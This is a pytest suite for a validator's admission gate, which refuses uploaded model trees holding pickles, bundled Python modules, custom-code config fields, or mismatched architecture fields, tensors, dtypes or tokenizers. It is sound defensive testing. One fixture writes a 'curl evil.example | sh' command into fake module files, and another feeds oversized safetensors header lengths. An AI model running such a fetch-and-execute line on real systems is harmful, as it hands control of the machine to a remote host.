"""The §1.1 model-tree refusals (docs/WHITEPAPER.md §1.1, the build plan M0 exits 8-13).

These are the checks that replace what an adapter over a pinned base gave for free, so the tests
that matter are the ones pinning what is REFUSED. The first of them — a pickle archive anywhere in
the tree — is not about fairness at all: `.bin`/`.pt`/`.pth` run arbitrary code when loaded, and the
validator is the single machine holding the subnet's scoring authority. That test is what carries
the "no miner code ever executes" property (§2.1) through the full-weights upload format, and §2.1
is what permits public benchmarks to be used at all.

The fixture is a miniature model tree: a realistic Qwen3-MoE `config.json` beside byte-valid
safetensors shards holding tensors of a few dozen bytes. That is possible precisely because the
checks are data-driven — the inventory is `name -> (dtype, shape)`, not a loaded model — so the
whole §1.1 gate is exercised without the 70 GB artifact it is defined against.
"""

from __future__ import annotations

import json
import math
from pathlib import Path

import pytest

from thirtyspokes.v3.admission import (
    AdmissionError,
    Reference,
    TensorSpec,
    admit,
    describe,
)
from thirtyspokes.v3.config import DTYPE, UNPINNED

# The reference's architectural fields as a Qwen3 MoE `config.json` spells them (D7), plus two
# fields that are deliberately NOT architectural — a library version and a cache flag change when a
# miner re-saves the model and must not cost them their one shot.
_CONFIG = {
    "model_type": "qwen3_moe",
    "architectures": ["Qwen3MoeForCausalLM"],
    "num_hidden_layers": 48,
    "hidden_size": 4096,
    "intermediate_size": 12288,
    "moe_intermediate_size": 768,
    "num_attention_heads": 32,
    "num_key_value_heads": 4,
    "head_dim": 128,
    "num_experts": 128,
    "num_experts_per_tok": 8,
    "vocab_size": 151936,
    "max_position_embeddings": 262144,
    "rope_theta": 10000000.0,
    "rope_scaling": None,
    "transformers_version": "4.99.0",
    "use_cache": True,
}

# Miniature shapes: the shards are real, byte-valid safetensors files rather than header stubs, and
# nothing in the gate correlates a config value with a tensor shape (the inventory is the check).
_SHARD_ONE = {
    "model.embed_tokens.weight": TensorSpec("BF16", (32, 8)),
    "model.layers.0.self_attn.q_proj.weight": TensorSpec("BF16", (8, 8)),
}
_SHARD_TWO = {
    "model.layers.0.mlp.experts.0.down_proj.weight": TensorSpec("BF16", (8, 4)),
    "lm_head.weight": TensorSpec("BF16", (32, 8)),
}

_ITEMSIZE = {"BF16": 2, "F16": 2, "F32": 4}


def _write_shard(path: Path, tensors: dict[str, TensorSpec], *, with_data: bool = True) -> None:
    header: dict[str, dict] = {}
    offset = 0
    for name, spec in tensors.items():
        nbytes = _ITEMSIZE[spec.dtype] * math.prod(spec.shape)
        header[name] = {"dtype": spec.dtype, "shape": list(spec.shape),
                        "data_offsets": [offset, offset + nbytes]}
        offset += nbytes
    blob = json.dumps(header).encode()
    path.write_bytes(len(blob).to_bytes(8, "little") + blob + (bytes(offset) if with_data else b""))


def _reference_tree(root: Path) -> Path:
    root.mkdir(parents=True)
    (root / "config.json").write_text(json.dumps(_CONFIG, indent=2))
    (root / "tokenizer.json").write_text('{"model": {"vocab": {"hello": 0, "world": 1}}}')
    (root / "tokenizer_config.json").write_text('{"chat_template": "{{ messages }}"}')
    _write_shard(root / "model-00001-of-00002.safetensors", _SHARD_ONE)
    _write_shard(root / "model-00002-of-00002.safetensors", _SHARD_TWO)
    return root


@pytest.fixture
def tree(tmp_path: Path) -> Path:
    return _reference_tree(tmp_path / "model")


@pytest.fixture
def reference(tree: Path) -> Reference:
    """Pinned from the pristine tree, before any test mutates it — as the owner pins it at M0."""
    return describe(tree)


def _refusal(root: Path, reference: Reference) -> str:
    with pytest.raises(AdmissionError) as caught:
        admit(root, reference)
    return str(caught.value)


def test_the_reference_tree_itself_passes_every_check(tree, reference):
    """M0 exit 13. A gate that refuses the thing it is defined against would refuse everyone, and
    the miner who found out would have spent their one submission discovering it."""
    admit(tree, reference)


def test_a_pickle_archive_anywhere_in_the_tree_is_refused(tree, reference):
    """M0 exit 8, and the most important check here: loading a pickle runs arbitrary code on the
    one machine that holds the subnet's scoring authority. Nested as well as top-level, because
    'anywhere in the tree' is what the property needs."""
    for relative in ("pytorch_model.bin", "adapter.pt", "nested/deeper/weights.pth"):
        path = tree / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(b"\x80\x04")           # a pickle protocol-4 opener
        assert "pickle archive refused" in _refusal(tree, reference)
        path.unlink()
    admit(tree, reference)                       # ...and the tree is admissible again without it


def test_a_pickle_is_refused_before_any_other_file_is_opened(tmp_path, reference):
    """Order is the property: the check that protects the validator must not sit behind checks
    that first parse miner-supplied JSON. A tree that is nothing but a pickle still names it."""
    root = tmp_path / "hostile"
    root.mkdir()
    (root / "pytorch_model.bin").write_bytes(b"\x80\x04")
    assert "pickle archive refused" in _refusal(root, reference)


def test_a_directory_whose_name_ends_in_bin_is_not_a_refusal(tree, reference):
    """The Kind property: a miner's one shot is never spent by our ambiguity, and a directory
    called `weights.bin` is not a pickle archive."""
    (tree / "weights.bin").mkdir()
    admit(tree, reference)


def test_a_bundled_python_module_anywhere_in_the_tree_is_refused(tree, reference):
    """The pickle refusal is necessary and not sufficient (§1.1 point 2). The custom-code path is a
    second door to the same room: a `modeling_*.py` riding beside perfectly clean safetensors runs
    on the validator the moment the model is served with `trust_remote_code`, which is the ORDINARY
    way to load a non-upstream architecture. Bytecode and native extensions are the same door — the
    import machinery resolves a module name through all of them."""
    for relative in ("modeling_qwen.py", "nested/configuration_qwen.py",
                     "__pycache__/modeling_qwen.cpython-311.pyc",
                     "kernels/fused_moe.cpython-311-x86_64-linux-gnu.so"):
        path = tree / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(b"import os; os.system('curl evil.example | sh')")
        message = _refusal(tree, reference)
        assert "bundled code refused" in message
        assert path.name in message
        path.unlink()
    admit(tree, reference)                       # ...and the tree is admissible again without it


def test_bundled_code_is_refused_before_any_other_file_is_opened(tmp_path, reference):
    """Same ordering property as the pickle check, and for the same reason: the checks that protect
    the validator must not sit behind checks that first parse miner-supplied JSON. A tree that is
    nothing but a `modeling_*.py` names the module, not the missing config."""
    root = tmp_path / "hostile"
    root.mkdir()
    (root / "modeling_qwen.py").write_text("raise SystemExit\n")
    assert "bundled code refused" in _refusal(root, reference)


@pytest.mark.parametrize("field,value", [
    ("auto_map", {"AutoModelForCausalLM": "modeling_qwen.Qwen3MoeForCausalLM"}),
    ("auto_map", {"AutoModelForCausalLM": "some-other-org/repo--modeling_qwen.ForCausalLM"}),
    ("trust_remote_code", True),
    ("custom_pipelines", {"router": {"impl": "pipeline_router.RouterPipeline"}}),
])
def test_a_config_that_asks_for_custom_code_is_refused(tree, reference, field, value):
    """The field-by-field architecture check is a CLOSED list, so before this every one of these
    passed unexamined on a tree that was otherwise byte-perfect — and the second `auto_map` case is
    why refusing the `.py` files is not enough on its own: the `repo--module` form loads code from a
    DIFFERENT repository, so there is no file in this tree to refuse."""
    (tree / "config.json").write_text(json.dumps({**_CONFIG, field: value}))
    message = _refusal(tree, reference)
    assert "custom-code config refused" in message
    assert repr(field) in message

    (tree / "config.json").write_text(json.dumps(_CONFIG))   # the same tree, minus the one key
    admit(tree, reference)


def test_a_sub_config_that_asks_for_custom_code_is_refused(tree, reference):
    """`auto_map` is read off sub-configs too, so "anywhere in the file" is the property, exactly as
    "anywhere in the tree" is the property for the files."""
    (tree / "config.json").write_text(json.dumps(
        {**_CONFIG, "text_config": {"auto_map": {"AutoConfig": "configuration_qwen.Config"}}}))
    assert "custom-code config refused" in _refusal(tree, reference)


@pytest.mark.parametrize("field,value", [
    ("num_hidden_layers", 40),                       # layer count
    ("hidden_size", 5120),                           # hidden size
    ("num_experts", 64),                             # expert count
    ("num_experts_per_tok", 4),                      # routing width
    ("vocab_size", 32000),                           # vocabulary
    ("rope_theta", 1000000.0),                       # RoPE settings
    ("rope_scaling", {"type": "yarn", "factor": 4}),
    ("model_type", "llama"),
    ("architectures", ["LlamaForCausalLM"]),
])
def test_a_differing_architectural_field_is_refused_and_named(tree, reference, field, value):
    """M0 exit 9. Every field §1 names, each refused on its own, with the field in the message —
    a miner who cannot tell which field was wrong cannot fix it."""
    (tree / "config.json").write_text(json.dumps({**_CONFIG, field: value}))
    message = _refusal(tree, reference)
    assert "architecture mismatch" in message
    assert repr(field) in message


def test_an_architectural_field_that_is_absent_or_added_is_refused(tree, reference):
    """Present-vs-absent is a mismatch as much as a differing value: an MoE config that simply
    omits `num_experts` is not the pinned architecture, it is an unanswered question."""
    (tree / "config.json").write_text(
        json.dumps({k: v for k, v in _CONFIG.items() if k != "num_experts"}))
    assert "<absent>" in _refusal(tree, reference)

    (tree / "config.json").write_text(json.dumps({**_CONFIG, "rope_scaling": {"factor": 2}}))
    assert "architecture mismatch" in _refusal(tree, reference)


def test_a_non_architectural_field_may_differ(tree, reference):
    """Re-saving a model with a newer library rewrites the version string and the key order without
    touching one architectural decision. Refusing that would spend a shot on cosmetics."""
    reordered = {"use_cache": False, "transformers_version": "5.1.0",
                 **{k: v for k, v in _CONFIG.items() if k not in ("use_cache",
                                                                  "transformers_version")}}
    (tree / "config.json").write_text(json.dumps(reordered))
    admit(tree, reference)


def test_a_missing_config_is_refused(tree, reference):
    (tree / "config.json").unlink()
    assert "config.json is missing" in _refusal(tree, reference)


def test_an_extra_tensor_is_refused(tree, reference):
    """M0 exit 10. Anything outside the inventory is part of a model that was never pinned."""
    _write_shard(tree / "model-00003-of-00003.safetensors",
                 {"model.layers.1.self_attn.q_proj.weight": TensorSpec("BF16", (8, 8))})
    message = _refusal(tree, reference)
    assert "extra tensor" in message
    assert "model.layers.1.self_attn.q_proj.weight" in message


def test_a_missing_tensor_is_refused(tree, reference):
    (tree / "model-00002-of-00002.safetensors").unlink()
    message = _refusal(tree, reference)
    assert "missing tensor" in message
    assert "lm_head.weight" in message


def test_a_renamed_tensor_is_refused(tree, reference):
    """Refused, never coerced: nothing here guesses that `lm_head.w` meant `lm_head.weight`."""
    renamed = {("lm_head.w" if name == "lm_head.weight" else name): spec
               for name, spec in _SHARD_TWO.items()}
    _write_shard(tree / "model-00002-of-00002.safetensors", renamed)
    message = _refusal(tree, reference)
    assert "lm_head.w" in message
    assert "extra tensor" in message or "missing tensor" in message


def test_a_reshaped_tensor_is_refused(tree, reference):
    """A tensor of the right name and the wrong shape is a different architecture wearing the
    reference's tensor names."""
    reshaped = {**_SHARD_ONE,
                "model.layers.0.self_attn.q_proj.weight": TensorSpec("BF16", (8, 16))}
    _write_shard(tree / "model-00001-of-00002.safetensors", reshaped)
    message = _refusal(tree, reference)
    assert "reshaped tensor" in message
    assert "(8, 16)" in message and "(8, 8)" in message


def test_a_tree_at_the_wrong_dtype_is_refused(tree, reference):
    """M0 exit 12. Quantisation changes quality, so two precisions are not the same experiment and
    a duel between them would be comparing numerics rather than routing."""
    assert DTYPE == "bfloat16"
    assert all(spec.dtype == "BF16" for spec in reference.tensors.values())
    _write_shard(tree / "model-00001-of-00002.safetensors",
                 {name: TensorSpec("F16", spec.shape) for name, spec in _SHARD_ONE.items()})
    message = _refusal(tree, reference)
    assert "wrong dtype" in message
    assert "F16" in message and "BF16" in message


def test_a_tensor_present_in_two_shards_is_refused(tree, reference):
    """Which copy would be scored is undefined, and a check that silently took one would score
    weights the miner did not choose."""
    _write_shard(tree / "model-00003-of-00003.safetensors",
                 {"lm_head.weight": TensorSpec("BF16", (32, 8))})
    assert "duplicate tensor" in _refusal(tree, reference)


def test_a_tree_with_no_weight_file_is_refused(tree, reference):
    """A tree with no safetensors is not an empty model, it is an unfinished upload — and §7 makes
    `manifest.json` the commit marker precisely because interrupted 70 GB uploads are the common
    case, not the edge case."""
    for shard in tree.glob("*.safetensors"):
        shard.unlink()
    assert "no weight file" in _refusal(tree, reference)


@pytest.mark.parametrize("payload", [
    b"\x04\x00\x00",                                          # too short for a header length
    (8).to_bytes(8, "little") + b"not json",                  # header is not JSON
    (2**40).to_bytes(8, "little") + b"{}",                    # absurd declared header length
    (4096).to_bytes(8, "little") + b'{"a": 1}',               # header runs past the end of the file
    (7).to_bytes(8, "little") + b'["nope"]',                  # JSON, but not a tensor map
    (30).to_bytes(8, "little") + b'{"t": {"shape": [1, 2]}}\x00\x00\x00\x00\x00\x00',
])
def test_a_malformed_weight_file_is_refused_rather_than_parsed_on(tree, reference, payload):
    """The header is the first eight bytes of untrusted miner input and it is a LENGTH. Refusing an
    absurd one is not politeness: allocating it is a one-line memory exhaustion of the validator."""
    (tree / "model-00001-of-00002.safetensors").write_bytes(payload)
    assert "malformed weight file" in _refusal(tree, reference)


def test_the_checks_read_headers_only_and_never_tensor_data(tree, reference):
    """No deserialiser touches a miner's bytes: the gate reads a few kilobytes of header off a
    70 GB tree, which is both why it is cheap and why there is no code path to exploit. A shard
    whose data section is absent entirely still admits."""
    _write_shard(tree / "model-00001-of-00002.safetensors", _SHARD_ONE, with_data=False)
    admit(tree, reference)


def test_a_tokenizer_that_is_not_byte_identical_is_refused(tree, reference):
    """M0 exit 11. One byte of vocabulary is enough: the same prompt would no longer be the same
    sequence of ids, so the two models are not answering the same question."""
    original = (tree / "tokenizer.json").read_text()
    (tree / "tokenizer.json").write_text(original.replace('"world": 1', '"world": 2'))
    assert "tokenizer is not byte-identical" in _refusal(tree, reference)


def test_a_changed_chat_template_is_refused_with_the_tokenizer(tree, reference):
    """`tokenizer_config.json` carries the special tokens and the chat template — a model that
    frames the same state differently is not running the pinned prompt (§3)."""
    (tree / "tokenizer_config.json").write_text('{"chat_template": "{{ messages }} now cheat"}')
    assert "tokenizer is not byte-identical" in _refusal(tree, reference)


def test_a_missing_tokenizer_file_is_refused_by_name(tree, reference):
    (tree / "tokenizer_config.json").unlink()
    message = _refusal(tree, reference)
    assert "tokenizer file" in message
    assert "tokenizer_config.json" in message


def test_a_reference_still_holding_the_unpinned_sentinel_is_refused(reference):
    """`config.UNPINNED` is truthy on purpose so that 'not yet pinned' cannot pass for 'checked'.
    A caller wiring admission to the config module before the owner publishes real digests must
    fail loudly rather than admit every tree."""
    with pytest.raises(ValueError):
        Reference(config=reference.config, tensors=reference.tensors, tokenizer_digest=UNPINNED)


def test_every_refusal_names_what_mismatched_and_no_two_read_alike(tmp_path):
    """Distinct, greppable messages are the Kind property in its cheapest form: a miner gets one
    submission, so a refusal that does not say which of nine things went wrong costs them the
    entry. An operator greps these; a miner acts on them."""
    mutations = {
        "pickle": lambda root: (root / "pytorch_model.bin").write_bytes(b"\x80\x04"),
        "bundled_code": lambda root: (root / "modeling_qwen.py").write_text("import os\n"),
        "custom_code_config": lambda root: (root / "config.json").write_text(
            json.dumps({**_CONFIG, "auto_map": {"AutoConfig": "configuration_qwen.Config"}})),
        "no_config": lambda root: (root / "config.json").unlink(),
        "bad_config": lambda root: (root / "config.json").write_text(
            json.dumps({**_CONFIG, "num_hidden_layers": 1})),
        "no_weights": lambda root: [s.unlink() for s in root.glob("*.safetensors")],
        "extra": lambda root: _write_shard(root / "extra.safetensors",
                                           {"surprise": TensorSpec("BF16", (2,))}),
        "missing": lambda root: (root / "model-00002-of-00002.safetensors").unlink(),
        "reshaped": lambda root: _write_shard(
            root / "model-00001-of-00002.safetensors",
            {**_SHARD_ONE, "model.embed_tokens.weight": TensorSpec("BF16", (1, 1))}),
        "dtype": lambda root: _write_shard(
            root / "model-00002-of-00002.safetensors",
            {name: TensorSpec("F32", spec.shape) for name, spec in _SHARD_TWO.items()}),
        "duplicate": lambda root: _write_shard(root / "again.safetensors",
                                               {"lm_head.weight": TensorSpec("BF16", (32, 8))}),
        "malformed": lambda root: (root / "model-00001-of-00002.safetensors").write_bytes(b"junk"),
        "no_tokenizer": lambda root: (root / "tokenizer.json").unlink(),
        "changed_tokenizer": lambda root: (root / "tokenizer.json").write_text("{}"),
    }
    headlines = set()
    for label, mutate in mutations.items():
        root = _reference_tree(tmp_path / label)
        reference = describe(root)
        mutate(root)
        headlines.add(_refusal(root, reference).split(":")[0])
    assert len(headlines) == len(mutations)


def test_describe_pins_only_the_architectural_fields(tree):
    """What the owner publishes at M0 is the architecture, not the library that last wrote it."""
    reference = describe(tree)
    assert "transformers_version" not in reference.config
    assert reference.config["num_experts_per_tok"] == 8
    assert set(reference.tensors) == set(_SHARD_ONE) | set(_SHARD_TWO)


# --- the nested config, which is how the REAL pinned reference spells these fields ----------------
#
# `_CONFIG` above is flat, and every test above it passed while admission read only the top level.
# The pinned artifact is not flat: `model_type` and `architectures` sit at the top, the other
# thirteen fields sit in `text_config`, and `rope_theta` sits deeper again in `rope_parameters`.
# Read flat, thirteen of fifteen fields were absent on BOTH sides and compared equal — so the
# field-by-field check §1.1 calls load-bearing admitted anything the tensor inventory happened not
# to catch. These tests are written against the real shape rather than the fixture's.

_NESTED_ONLY = {"model_type", "architectures"}


def _nested_config() -> dict:
    """`_CONFIG`, re-spelled the way the pinned reference spells it."""
    text = {k: v for k, v in _CONFIG.items()
            if k not in _NESTED_ONLY and k not in {"rope_theta", "transformers_version",
                                                   "use_cache"}}
    text["model_type"] = "qwen3_moe_text"
    text["rope_parameters"] = {"rope_type": "default", "rope_theta": _CONFIG["rope_theta"]}
    return {
        "model_type": _CONFIG["model_type"],
        "architectures": _CONFIG["architectures"],
        "text_config": text,
        "vision_config": {"model_type": "qwen3_moe", "hidden_size": 1152},
        "transformers_version": _CONFIG["transformers_version"],
        "use_cache": _CONFIG["use_cache"],
    }


def _nested_tree(root: Path) -> Path:
    tree = _reference_tree(root)
    (tree / "config.json").write_text(json.dumps(_nested_config()))
    return tree


def test_a_nested_config_is_read_where_the_fields_actually_are(tmp_path):
    """Flat reading captured 2 of 15 on the real artifact. The absent ones were not refused — they
    were compared absent-against-absent and passed."""
    reference = describe(_nested_tree(tmp_path / "model"))

    # Keyed by the BLOCK each field lives in, because that is what decides what a loader builds.
    for field in ("num_hidden_layers", "hidden_size", "num_experts", "num_experts_per_tok",
                  "vocab_size", "max_position_embeddings"):
        assert f"text_config.{field}" in reference.config, f"{field} not read from text_config"
    assert reference.config["text_config.num_experts_per_tok"] == 8
    assert reference.config["text_config.rope_parameters.rope_theta"] == _CONFIG["rope_theta"]


def test_the_outer_identity_fields_survive_the_nesting(tmp_path):
    """`architectures` lives at the top level and ONLY there. Swapping the read to `text_config`
    instead of overlaying it would trade thirteen missed fields for two."""
    reference = describe(_nested_tree(tmp_path / "model"))

    assert reference.config["architectures"] == ["Qwen3MoeForCausalLM"]


def test_a_nested_tree_admits_itself(tmp_path):
    tree = _nested_tree(tmp_path / "model")
    admit(tree, describe(tree))


def test_a_changed_routing_width_is_refused_though_it_changes_no_tensor(tmp_path):
    """The routing width §1 names explicitly. It changes no tensor's shape, so the inventory cannot
    backstop it: if the config check does not read it, nothing does, and a model that routes to
    twice as many experts is served as uploaded."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["text_config"]["num_experts_per_tok"] = 16
    (tree / "config.json").write_text(json.dumps(config))

    assert "num_experts_per_tok" in _refusal(tree, reference)


def test_a_changed_nested_context_length_is_refused(tmp_path):
    """Also changes no tensor."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["text_config"]["max_position_embeddings"] = 4096
    (tree / "config.json").write_text(json.dumps(config))

    assert "max_position_embeddings" in _refusal(tree, reference)


def test_a_changed_rope_setting_is_refused_from_one_level_deeper(tmp_path):
    """§1 pins RoPE settings, and `rope_theta` moved house into `rope_parameters`. A field that
    moves between model revisions is the one a flat read misses in silence."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["text_config"]["rope_parameters"]["rope_theta"] = 500.0
    (tree / "config.json").write_text(json.dumps(config))

    assert "rope_theta" in _refusal(tree, reference)


def test_custom_code_is_still_refused_when_asked_for_at_the_top_level(tmp_path):
    """The deny-list is a question about the WHOLE file, not about the nested block: `auto_map` is
    a top-level request for code, and the overlay must not move where that is looked for."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["auto_map"] = {"AutoModelForCausalLM": "modeling_x.QwenX"}
    (tree / "config.json").write_text(json.dumps(config))

    assert "auto_map" in _refusal(tree, reference)


def test_the_outer_identity_is_not_shadowed_by_the_text_tower(tmp_path):
    """`model_type` names the whole artifact; `text_config.model_type` names one tower inside it.
    Overlaying the inner over the outer replaced the artifact's identity with its text half's, so a
    candidate declaring a different outer type was no longer compared at all — the overlay's own
    regression, and it hit one of the only two fields the flat read got right."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)
    assert reference.config["model_type"] == _CONFIG["model_type"], "the OUTER type is the pin"

    config = _nested_config()
    config["model_type"] = "llama"
    (tree / "config.json").write_text(json.dumps(config))

    assert "model_type" in _refusal(tree, reference)


def test_a_changed_rope_type_is_refused(tmp_path):
    """§1 pins RoPE settings. This revision spells them `rope_parameters.rope_type` rather than
    `rope_scaling`, and none of them changes a tensor — so before the current spelling joined the
    closed list, switching the long-context behaviour was admitted."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["text_config"]["rope_parameters"]["rope_type"] = "yarn"
    (tree / "config.json").write_text(json.dumps(config))

    assert "rope_type" in _refusal(tree, reference)


def test_an_architecture_refusal_tells_a_miner_the_likely_cause(tmp_path):
    """A refusal spends the one submission a hotkey ever gets, so the message has to be actionable.

    The overwhelmingly likely cause of a field mismatch is not a miner changing the architecture —
    it is `save_pretrained` re-serialising `config.json` under a different `transformers` version,
    which renames fields and moves them between blocks. A message that says only "mismatch" leaves a
    miner to guess that, having already spent the shot.
    """
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    config["text_config"]["num_experts_per_tok"] = 16
    (tree / "config.json").write_text(json.dumps(config))

    message = _refusal(tree, reference)
    assert "num_experts_per_tok" in message
    assert "config.json" in message and "check" in message


def test_a_field_hoisted_out_of_its_block_is_refused(tmp_path):
    """The hole a flat view of the config leaves open, and it is not a technicality.

    `transformers` builds the text tower from `text_config`. A candidate that moves
    `num_experts_per_tok` up to the top level — keeping the reference's own value — compared equal
    under a flat overlay, while the loader found nothing in `text_config` and built on a default. So
    admission certified a model that routes differently from the one it checked. A field is now
    compared where the reference keeps it, and a field that has moved has moved.
    """
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    config = _nested_config()
    hoisted = config["text_config"].pop("num_experts_per_tok")
    config["num_experts_per_tok"] = hoisted            # same value, different home
    (tree / "config.json").write_text(json.dumps(config))

    assert "num_experts_per_tok" in _refusal(tree, reference)


def test_a_field_the_reference_does_not_have_is_refused_wherever_it_appears(tmp_path):
    """The same hole from the other side: comparing only the reference's own keys would let an
    added field through, and an added field is how a default gets overridden."""
    tree = _nested_tree(tmp_path / "model")
    reference = describe(tree)

    assert not any("mrope_section" in key for key in reference.config), (
        "this test needs a field the reference genuinely does not have")

    config = _nested_config()
    config["text_config"]["mrope_section"] = [16, 8, 8]
    (tree / "config.json").write_text(json.dumps(config))

    assert "mrope_section" in _refusal(tree, reference)


def test_a_field_in_two_blocks_is_checked_in_both(tmp_path):
    """`partial_rotary_factor` is in `text_config` AND `rope_parameters` on the real artifact.
    Keying by path checks each copy where it sits, so neither goes unexamined."""
    tree = _nested_tree(tmp_path / "model")
    config = _nested_config()
    config["text_config"]["partial_rotary_factor"] = 0.25
    config["text_config"]["rope_parameters"]["partial_rotary_factor"] = 0.25
    (tree / "config.json").write_text(json.dumps(config))
    reference = describe(tree)
    assert "text_config.partial_rotary_factor" in reference.config
    assert "text_config.rope_parameters.partial_rotary_factor" in reference.config

    config["text_config"]["partial_rotary_factor"] = 1.0        # only the outer copy moves
    (tree / "config.json").write_text(json.dumps(config))

    assert "partial_rotary_factor" in _refusal(tree, reference)
